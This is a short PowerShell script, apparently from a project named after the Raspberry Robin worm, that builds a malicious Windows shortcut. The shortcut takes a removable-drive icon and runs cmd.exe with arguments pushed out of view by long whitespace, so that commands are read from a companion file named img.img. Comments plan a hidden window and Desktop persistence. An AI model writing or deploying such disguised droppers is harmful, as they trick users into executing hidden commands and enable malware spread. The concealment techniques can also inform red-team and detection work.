#CREANDO LNK

# Set the path to the file containing the command arguments
$argFilePath = "C:\Users\hernandezcfran\OneDrive - Ayuntamiento de Madrid\Code\CuchiBerryRobin\img.img"

# Set the path to where you want to create the shortcut
$shortcutPath = "Berry.lnk"

# Set the character set to use for the random string
$charSet = "CUCHIBERRYROBIN"

# Generate a random string of length 100 using the character set
$description = -join ((Get-Random -Count 100 -InputObject $charSet.ToCharArray()))

# Create a WScript.Shell object
$shell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the shortcut properties
# Set the path to the file you want to create a shortcut for
$targetPath = "C:\Windows\System32\cmd.exe"
$shortcut.RelativePath = ""
$shortcut.TargetPath = $targetPath
$shortcut.WindowStyle = 1 #PDTE de poner a 7
$shortcut.Description = $description
# Set the icon to the removable drive icon
$iconLocation = "%SystemRoot%\System32\imageres.dll,27"
$shortcut.IconLocation = $iconLocation
# Set the arguments to run the command from the arg file
$shortcut.Arguments = "/c @`"" + $argFilePath + "`""
#$shortcut.Arguments = "CMd < '$argFilePath'"
$shortcut.Arguments = "
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
          /V/RcmD<img.img"

# Save the shortcut
$shortcut.Save()





#Lets persist in the Desktop
#echo [Environment]::GetFolderPath("Desktop")+"\a.txt"





